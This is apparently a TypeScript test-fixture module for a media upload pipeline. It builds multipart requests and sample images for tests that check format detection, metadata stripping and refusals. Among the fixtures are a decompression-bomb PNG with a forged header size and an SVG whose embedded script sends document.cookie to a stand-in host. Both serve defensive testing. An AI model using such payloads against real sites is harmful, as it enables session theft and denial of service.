import sharp from 'sharp'
import { spawn } from 'node:child_process'
import ffmpegPath from 'ffmpeg-static'
import { mkdtemp, readFile, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { buildApp } from '../../src/app.ts'
import { createFixtureContentSource } from '../../src/modules/public/content.ts'
import { createMemoryDriver } from '../../src/modules/media/storage.ts'
import { createInlineQueue } from '../../src/modules/media/queue.ts'
import { createMember, resetAuthTables, bearerFor } from './auth.ts'
import type { GwcApp } from '../../src/app.ts'
import type { Pool } from 'pg'
import type { StorageDriver } from '../../src/modules/media/storage.ts'

/**
 * Scaffolding for the media suites.
 *
 * Storage is the in-memory driver and the queue is the inline one, both
 * exported from the production modules so a change to either interface cannot
 * leave the double behind. What is *not* faked is the pipeline: `sharp` really
 * encodes, `file-type` really inspects magic bytes, and the routes are the real
 * routes. These suites are about the pipeline, so faking it would leave nothing
 * worth asserting.
 */

export type BuildMediaAppOptions = {
  storage?: StorageDriver
  queue?: unknown
  [key: string]: unknown
}

export async function buildMediaApp({ storage, queue, ...overrides }: BuildMediaAppOptions = {}) {
  const app = await buildApp({
    contentSource: createFixtureContentSource([]),
    storage: storage ?? createMemoryDriver(),
    jobQueue: queue ?? createInlineQueue(),
    ...overrides,
  })
  await app.ready()
  return app
}

/**
 * A member holding a valid bearer, ready to upload.
 *
 * Call this from `beforeAll`, **not** `beforeEach`. It truncates `sessions`,
 * which is shared by every suite, so running it between tests can pull the
 * session out from under a request that is still settling — producing a 401
 * that has nothing to do with what the test is asserting. These suites are
 * about the media pipeline; the session is a fixture, so it is created once per
 * file and left alone. Per-test isolation of the things these suites *do* care
 * about is `resetMedia`, which touches only assets and counters.
 */
export async function uploader(app: GwcApp) {
  await resetAuthTables(app.pg)
  const member = await createMember(app.pg)
  const headers = await bearerFor(app, { accountId: member.id, accountKind: 'member' })
  return { member, headers }
}

/** Remove every asset, so byte-count assertions start from a known state. */
export async function resetMedia(pool: Pool) {
  await pool.query('TRUNCATE asset_variants, assets RESTART IDENTITY CASCADE')
  await pool.query(`DELETE FROM counters WHERE scope = 'media.stored_bytes'`)
}

const BOUNDARY = '----gwcMediaTestBoundary'

/**
 * Build a multipart body by hand.
 *
 * Deliberately not a form-data library: the upload route's whole job is to
 * decide from bytes, and constructing the bytes here means a test can send a
 * filename that disagrees with its contents — which is exactly what SC-021 is
 * about and what a well-behaved library would prevent.
 */
export type MultipartInput = {
  file: Buffer
  filename?: string
  contentType?: string
  fields?: Record<string, string>
}

export function multipartBody({
  file, filename = 'upload.bin', contentType = 'application/octet-stream', fields = {},
}: MultipartInput) {
  const parts: Buffer[] = []

  for (const [name, value] of Object.entries(fields)) {
    parts.push(
      Buffer.from(
        `--${BOUNDARY}\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${value}\r\n`,
        'utf8',
      ),
    )
  }

  if (file) {
    parts.push(
      Buffer.from(
        `--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\n` +
          `Content-Type: ${contentType}\r\n\r\n`,
        'utf8',
      ),
      file,
      Buffer.from('\r\n', 'utf8'),
    )
  }

  parts.push(Buffer.from(`--${BOUNDARY}--\r\n`, 'utf8'))

  return {
    payload: Buffer.concat(parts),
    headers: { 'content-type': `multipart/form-data; boundary=${BOUNDARY}` },
  }
}

/** POST /media with a file and alt text. */
export function upload(
  app: GwcApp,
  headers: Record<string, string>,
  { file, filename, contentType, alt = 'A test image' }: MultipartInput & { alt?: string },
) {
  const body = multipartBody({ file, filename, contentType, fields: { alt } })
  return app.inject({
    method: 'POST',
    url: '/media',
    headers: { ...headers, ...body.headers },
    payload: body.payload,
  })
}

// ---- Fixture images --------------------------------------------------------

/**
 * A photographic source.
 *
 * Structured noise rather than a flat fill: a solid colour compresses to almost
 * nothing in every format, which would make the SC-019 size assertions pass
 * without saying anything about the encoder settings.
 */
export async function photograph({ width = 2400, height = 1600, quality = 92 } = {}) {
  const raw = Buffer.alloc(width * height * 3)
  for (let i = 0; i < raw.length; i += 1) {
    raw[i] = (Math.sin(i / 7) * 60 + Math.cos(i / 131) * 40 + 128 + (i % 17)) & 0xff
  }
  return sharp(raw, { raw: { width, height, channels: 3 } }).jpeg({ quality }).toBuffer()
}

/** A PNG with a real alpha channel — the case that must fall back to PNG. */
export async function transparentLogo({ width = 800, height = 400 } = {}) {
  return sharp({
    create: { width, height, channels: 4, background: { r: 20, g: 60, b: 140, alpha: 0.4 } },
  })
    .png()
    .toBuffer()
}

/** An opaque PNG — must fall back to JPEG, not PNG. */
export async function opaquePng({ width = 800, height = 400 } = {}) {
  return sharp({ create: { width, height, channels: 3, background: { r: 200, g: 40, b: 40 } } })
    .png()
    .toBuffer()
}

/** A source narrower than every breakpoint but the first. */
export async function smallImage({ width = 300, height = 200 } = {}) {
  const raw = Buffer.alloc(width * height * 3)
  for (let i = 0; i < raw.length; i += 1) raw[i] = (i * 7) & 0xff
  return sharp(raw, { raw: { width, height, channels: 3 } }).jpeg({ quality: 90 }).toBuffer()
}

/**
 * A PNG whose IHDR *declares* an enormous size while the file stays tiny.
 *
 * The decompression bomb from media-pipeline.md §4. Built by rewriting the
 * width and height fields of a real PNG header and repairing the CRC, so the
 * file is structurally valid right up to the point where a decoder would try to
 * allocate for it.
 */
export async function pixelBomb({ declaredWidth = 100_000, declaredHeight = 100_000 } = {}) {
  const real = await sharp({ create: { width: 10, height: 10, channels: 3, background: { r: 0, g: 0, b: 0 } } })
    .png()
    .toBuffer()

  const bomb = Buffer.from(real)
  // IHDR data begins at byte 16 in every PNG: 8 bytes of signature, then the
  // chunk length and type.
  bomb.writeUInt32BE(declaredWidth, 16)
  bomb.writeUInt32BE(declaredHeight, 20)

  // Repair the IHDR CRC so the header is well-formed and the file is refused
  // for the size it declares rather than for being corrupt.
  const crcTable = []
  for (let n = 0; n < 256; n += 1) {
    let c = n
    for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1
    crcTable[n] = c >>> 0
  }
  let crc = 0xffffffff
  for (let i = 12; i < 29; i += 1) crc = crcTable[(crc ^ bomb[i]!) & 0xff]! ^ (crc >>> 8)
  bomb.writeUInt32BE((crc ^ 0xffffffff) >>> 0, 29)

  return bomb
}

/** A tiny SVG — refused outright, since it can carry script. */
export const svgWithScript = Buffer.from(
  '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">' +
    '<script>fetch("https://elsewhere.example/steal?c="+document.cookie)</script></svg>',
  'utf8',
)

/**
 * A JPEG carrying GPS coordinates.
 *
 * `sharp` will not write arbitrary EXIF, so the APP1 segment is spliced in
 * directly after SOI — which is where a camera puts it, and is what a stripper
 * has to remove.
 */
export async function photographWithGps() {
  const base = await photograph({ width: 800, height: 600 })

  // A minimal TIFF header with one IFD holding a GPS IFD pointer, followed by
  // the GPS tags themselves. Little-endian throughout.
  const exifBody = Buffer.alloc(0x9e)
  exifBody.write('Exif\0\0', 0, 'ascii')
  const tiff = 6
  exifBody.write('II', tiff, 'ascii')
  exifBody.writeUInt16LE(42, tiff + 2)
  exifBody.writeUInt32LE(8, tiff + 4) // first IFD at offset 8 from the TIFF header

  exifBody.writeUInt16LE(1, tiff + 8) // one entry
  exifBody.writeUInt16LE(0x8825, tiff + 10) // GPSInfoIFDPointer
  exifBody.writeUInt16LE(4, tiff + 12) // LONG
  exifBody.writeUInt32LE(1, tiff + 14)
  exifBody.writeUInt32LE(0x1a, tiff + 18) // GPS IFD offset
  exifBody.writeUInt32LE(0, tiff + 22) // no next IFD

  const gps = tiff + 0x1a
  exifBody.writeUInt16LE(2, gps) // two entries
  // GPSLatitudeRef = 'N'
  exifBody.writeUInt16LE(1, gps + 2)
  exifBody.writeUInt16LE(2, gps + 4)
  exifBody.writeUInt32LE(2, gps + 6)
  exifBody.write('N\0', gps + 10, 'ascii')
  // GPSLongitudeRef = 'E'
  exifBody.writeUInt16LE(3, gps + 14)
  exifBody.writeUInt16LE(2, gps + 16)
  exifBody.writeUInt32LE(2, gps + 18)
  exifBody.write('E\0', gps + 22, 'ascii')
  exifBody.writeUInt32LE(0, gps + 26)

  const app1 = Buffer.concat([
    Buffer.from([0xff, 0xe1]),
    (() => {
      const len = Buffer.alloc(2)
      len.writeUInt16BE(exifBody.length + 2)
      return len
    })(),
    exifBody,
  ])

  // SOI, then the APP1 segment, then the rest of the original file.
  return Buffer.concat([base.subarray(0, 2), app1, base.subarray(2)])
}

/**
 * A real, short MP4, produced by ffmpeg's own test pattern generator.
 *
 * Synthesising one by hand is not an option here: the pipeline probes it with
 * ffmpeg and then transcodes it, so the fixture has to be a file ffmpeg
 * genuinely accepts. Two seconds at 320x240 keeps the transcode to a second or
 * so while still exercising the whole path.
 */
export async function shortVideo({ seconds = 2, width = 320, height = 240 } = {}) {
  const dir = await mkdtemp(path.join(tmpdir(), 'gwc-fixture-video-'))
  const output = path.join(dir, 'fixture.mp4')
  try {
    await new Promise<void>((resolve, reject) => {
      const child = spawn(
        ffmpegPath as unknown as string,
        [
          '-y', '-f', 'lavfi', '-i', `testsrc=size=${width}x${height}:rate=10`,
          '-t', String(seconds), '-c:v', 'libx264', '-pix_fmt', 'yuv420p', output,
        ],
        { stdio: 'ignore' },
      )
      child.on('error', reject)
      child.on('close', (code) => (code === 0 ? resolve() : reject(new Error(`ffmpeg exited ${code}`))))
    })
    return await readFile(output)
  } finally {
    await rm(dir, { recursive: true, force: true })
  }
}

/** Whether ffmpeg is usable here, so the video suites can skip loudly. */
export const hasFfmpeg = Boolean(ffmpegPath)
